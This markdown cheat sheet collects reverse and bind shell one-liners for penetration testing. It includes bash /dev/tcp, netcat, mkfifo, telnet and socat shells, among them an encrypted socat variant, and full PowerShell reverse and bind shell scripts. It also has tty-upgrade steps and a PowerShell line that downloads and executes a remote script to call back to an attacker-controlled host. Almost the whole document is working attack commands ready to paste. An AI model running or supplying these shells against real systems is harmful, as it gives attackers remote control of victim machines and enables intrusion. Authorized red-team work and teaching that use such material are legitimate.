## Linux fully interactive tty

```bash
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL + Z
stty raw -echo
fg
reset
export SHELL=/bin/bash && export TERM=xterm-256color
# open up a new terminal and run the below to get the stty size command to paste
size=$(stty size); rows=$(echo $size | cut -d' ' -f1); cols=$(echo $size | cut -d' ' -f2); echo "stty rows $rows columns $cols"
```

## bash: normal shell
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```
## bash: non-blocking shell
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &
```
## bash: using `exec` 
```bash
exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; done
```
## Bash/Netcat:
```bash
nc -nv <LHOST> <LPORT> -e /bin/bash
```
## bash: mkfifo:
```bash
rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc <LHOST> <LPORT> > /tmp/pipe; rm /tmp/pipe
```
## bash: mknod:
```bash
rm /tmp/pipe; mknod /tmp/pipe p 2>/dev/null && nc <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
```
## Bash UDP
```bash
sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1
```
## Telnet
```bash
rm /tmp/pipe; mknod /tmp/pipe p && telnet <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
```
---
## socat: reverse shell (with forking and address reuse)
### on attacker
```bash
socat -d -d TCP4-LISTEN:<LPORT>,reuseaddr,fork STDOUT
```
### on victim
```bash
socat TCP4:<LHOST>:<LPORT> EXEC:/bin/bash
```
**OR**
```bash
nc -nv <LHOST> <LPORT> -e /bin/bash
```
## socat: encrypted reverse shell (with forking and address reuse)
### step #1: on attacker machine, generate a create a key and a certificate associated with it.
```bash
openssl req -newkey rsa:2048 -nodes -keyout socat.key -x509 -days 1000 -out socat.crt
```
### step #2: on attacker machine,create a pem file from the key and crt files
```bash
cat socat.key socat.crt > socat.pem
```
### step #3: on attacker machine, listen on a port of your choice
```bash
socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork STDOUT
```
### step #4: on the victim, send back a bash shell
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0, EXEC:/bin/bash
```

---

## Powershell reverse shell
```powershell
$lhost = '<LHOST>'
$lport = <LPORT>
$client = New-Object System.Net.Sockets.TCPClient($lhost,$lport);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
```

## Powershell bind shell
```
$lport = <LPORT>
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$lport)
$listener.start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

## Windows better tty using `rlwrap`
1. install rlwrap using
```bash
apt install rlwrap
```
2. using rlwrap before your standard listener
```bash
rlwrap nc -lvnp <LPORT>
```

## Windows fully interactive (Windows 10 / Windows Server 2019 version 1809)
### on attacker machine:
```bash
stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>
```
### on victim machine:
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>
```